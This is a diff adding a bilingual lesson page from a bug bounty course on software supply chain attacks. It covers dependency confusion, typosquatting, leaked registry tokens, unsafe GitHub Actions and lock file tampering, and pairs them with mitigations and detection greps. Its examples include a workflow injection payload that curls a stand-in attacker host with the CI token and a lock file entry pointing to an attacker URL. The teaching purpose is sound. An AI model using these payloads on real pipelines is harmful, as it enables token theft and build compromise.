@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Supply Chain & Dependency Attacks - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 2: Source Code Audit &gt; Supply Chain &amp; Dependency Attacks
+        </div>
+
+        <div class="page-header">
+            <h1>Supply Chain & Dependency Attacks</h1>
+            <p class="subtitle">
+                Dependency Confusion, Typosquatting, GitHub Actions Supply Chain から Lock File Manipulation まで。ソフトウェアサプライチェーンを攻撃する手法。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-casestudy">Case Study</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Dependency Confusion</h2>
+            <p>Internal (private) package と同名の package を public registry に publish し、ビルドシステムに public 版をインストールさせる攻撃。</p>
+
+            <h3>攻撃メカニズム</h3>
+            <ol>
+                <li>Target が <code>@company/internal-utils</code> を private registry から使用</li>
+                <li>Attacker が <code>internal-utils</code> (scope なし) を npm public registry に高バージョンで publish</li>
+                <li>Package manager が「higher version wins」ルールで public 版を install</li>
+                <li>Attacker の package の <code>preinstall</code> script が実行される → RCE</li>
+            </ol>
+
+<pre><code>// package.json での internal package 参照 (脆弱な設定)
+{
+    "dependencies": {
+        "internal-utils": "^1.0.0"  // scope なし → public fallback
+    }
+}
+
+// .npmrc で private registry を設定していても...
+registry=https://npm.company.internal/
+// scope 未指定の package は public npm にも fallback する場合がある</code></pre>
+
+            <h3>影響を受ける Package Manager</h3>
+            <table>
+                <thead><tr><th>PM</th><th>攻撃条件</th><th>対策</th></tr></thead>
+                <tbody>
+                    <tr><td>npm</td><td>scope なし + .npmrc の registry 設定</td><td>scoped packages (@org/pkg) を使用</td></tr>
+                    <tr><td>pip</td><td>--extra-index-url 指定時</td><td>--index-url のみ使用 (extra 禁止)</td></tr>
+                    <tr><td>Maven</td><td>mirror 設定で public repo が優先</td><td>internal repo に全 dependency を mirror</td></tr>
+                    <tr><td>RubyGems</td><td>private source + public fallback</td><td>source block で制限</td></tr>
+                </tbody>
+            </table>
+
+            <div class="callout success">
+                <div class="callout-title">Bug Bounty での活用</div>
+                <p>Target の public repo から package.json / requirements.txt を読み、internal package 名を推測。public registry で claim されていない名前を見つけたら報告可能 (PoC は preinstall で DNS callback のみ)。</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Typosquatting</h2>
+            <p>人気パッケージの typo (タイプミス) 名で malicious package を publish する。</p>
+
+            <h3>よくある typo パターン</h3>
+            <ul>
+                <li><strong>文字の入れ替え</strong>: <code>requets</code> (requests)</li>
+                <li><strong>ハイフン/アンダースコア</strong>: <code>python_dateutil</code> vs <code>python-dateutil</code></li>
+                <li><strong>似た文字</strong>: <code>co1ors</code> (colors, l→1)</li>
+                <li><strong>Scope 間違い</strong>: <code>@angular-devkit/core</code> vs <code>angular-devkit-core</code></li>
+            </ul>
+
+            <h3>検出方法 (OSS audit 視点)</h3>
+<pre><code># package.json / requirements.txt の全 dependency を確認
+# 1. 極端に download 数が少ないパッケージ
+# 2. 最近 publish されたが author が不明
+# 3. preinstall/postinstall script がある
+
+# npm: package metadata 確認
+npm info suspicious-package
+
+# pip: PyPI で metadata 確認
+pip show suspicious-package</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>.npmrc / .pypirc Misconfiguration</h2>
+
+<pre><code># 危険: .npmrc が repo に commit されている
+# .npmrc に auth token が含まれている場合 → credential leak
+//registry.npmjs.org/:_authToken=npm_XXXXXXXXXXXX
+
+# 危険: .pypirc が露出
+[pypi]
+username = __token__
+password = pypi-XXXXXXXXXXXXXXXXXXXX
+
+# 検出:
+rg -n "_authToken|//registry" --glob ".npmrc"
+rg -n "password.*pypi-" --glob ".pypirc"
+rg -n "\.npmrc|\.pypirc" .gitignore  # gitignore されているか確認</code></pre>
+
+            <div class="callout warning">
+                <div class="callout-title">Git History にも注意</div>
+                <p>現在の <code>.gitignore</code> に含まれていても、過去の commit で <code>.npmrc</code> が push されていた可能性。<code>git log --all -- .npmrc</code> で確認。</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>GitHub Actions Supply Chain</h2>
+
+            <h3>Action Pinning の欠如</h3>
+<pre><code># 危険: tag で参照 (tag は移動可能)
+- uses: actions/checkout@v4
+
+# 安全: commit SHA で pin
+- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+
+# なぜ危険か: tag はリポジトリ owner が書き換え可能
+# supply chain attack で悪意あるコードが注入される</code></pre>
+
+            <h3>pull_request_target の罠</h3>
+<pre><code># 危険: pull_request_target + checkout of PR code
+on:
+  pull_request_target:  # write permission + secrets access
+
+jobs:
+  build:
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}  # 攻撃者のコード!
+      - run: npm install  # 攻撃者の package.json で preinstall RCE</code></pre>
+
+            <h3>Workflow Injection</h3>
+<pre><code># 危険: issue title/body を直接 run に埋め込み
+- run: echo "${{ github.event.issue.title }}"
+# Issue title に "; curl attacker.com/steal?token=$GITHUB_TOKEN" → RCE
+
+# 安全: environment variable 経由
+- run: echo "$ISSUE_TITLE"
+  env:
+    ISSUE_TITLE: ${{ github.event.issue.title }}</code></pre>
+
+            <h3>Detection (grep)</h3>
+<pre><code>rg -n "uses:.*@v[0-9]" --glob "*.yml" .github/workflows/
+rg -n "pull_request_target" --glob "*.yml" .github/workflows/
+rg -n "\$\{\{.*github\.event\." --glob "*.yml" .github/workflows/</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Lock File Manipulation</h2>
+            <p>Lock file (package-lock.json, yarn.lock) を改竄し、正規 package 名で malicious registry を参照させる。</p>
+
+<pre><code>// package-lock.json manipulation
+{
+    "packages": {
+        "node_modules/lodash": {
+            "version": "4.17.21",
+            "resolved": "https://attacker.com/lodash-4.17.21.tgz",  // 改竄!
+            "integrity": "sha512-..."  // attacker のパッケージの hash
+        }
+    }
+}
+
+// PR review で lock file の diff は見落とされやすい
+// npm ci は lock file を厳密に follow する → malicious package install</code></pre>
+
+            <div class="callout">
+                <div class="callout-title">検出ポイント</div>
+                <p>PR で lock file の <code>resolved</code> URL が変更されていないか確認。<code>registry.npmjs.org</code> 以外の URL が混入していたら要注意。</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Real Case: PayPal RCE via npm Dependency Confusion</h2>
+            <div class="card">
+                <p><strong>HackerOne #925585</strong> — $30,000 bounty</p>
+                <ul>
+                    <li>PayPal の内部 Node.js サービスが scope なしの internal package を使用</li>
+                    <li>同名 package を npm public registry に高バージョンで publish</li>
+                    <li><code>preinstall</code> script で DNS callback → 内部ネットワークからの通信を確認</li>
+                    <li>RCE 到達を証明 (hostname, whoami の結果を DNS exfiltration)</li>
+                </ul>
+                <p><strong>教訓</strong>: scope なしの internal package 名が public registry で未 claim は Critical finding。</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Bug Bounty での適用</h2>
+            <ol>
+                <li><strong>public repo の package.json / requirements.txt を確認</strong>: internal package 名を推測</li>
+                <li><strong>npm / PyPI で名前が claim されていないか確認</strong></li>
+                <li><strong>.npmrc / .pypirc の露出を確認</strong>: git history 含む</li>
+                <li><strong>GitHub Actions の workflow を確認</strong>: unpinned actions, injection, pull_request_target</li>
+                <li><strong>Report 時</strong>: DNS callback で到達を証明。実際の malicious code は実行しない (ethical)</li>
+            </ol>
+
+            <div class="callout warning">
+                <div class="callout-title">倫理的制約</div>
+                <p>Dependency confusion PoC は DNS/HTTP callback に留める。実際にシステムを侵害してはいけない。Package publish 前に target に報告するのがベストプラクティス。</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Key Takeaways</h2>
+            <div class="card">
+                <ul>
+                    <li><strong>Dependency Confusion</strong>: scope なし internal package + public registry fallback = RCE ($30K class)</li>
+                    <li><strong>GitHub Actions</strong>: unpinned action / pull_request_target / workflow injection は高頻度の attack surface</li>
+                    <li><strong>Lock file</strong>: resolved URL の改竄は PR review で見落とされやすい</li>
+                    <li><strong>.npmrc / .pypirc</strong>: token 露出は git history も含めて確認</li>
+                    <li>Supply chain 攻撃は<strong>コードを書かずに RCE</strong>できる — 発見時は即 Critical</li>
+                </ul>
+            </div>
+        </div>
+
+        <div style="text-align:center; margin: 2rem 0;">
+            <button class="complete-btn" data-module-id="27-dep" onclick="toggleComplete('27-dep')">Mark Complete</button>
+        </div>
+
+        <div class="page-nav">
+            <a href="26-deserialization.html">&larr; 前: Deserialization</a>
+            <a href="28-practice-whitebox.html">次: Practice: bb-whitebox-01 &rarr;</a>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
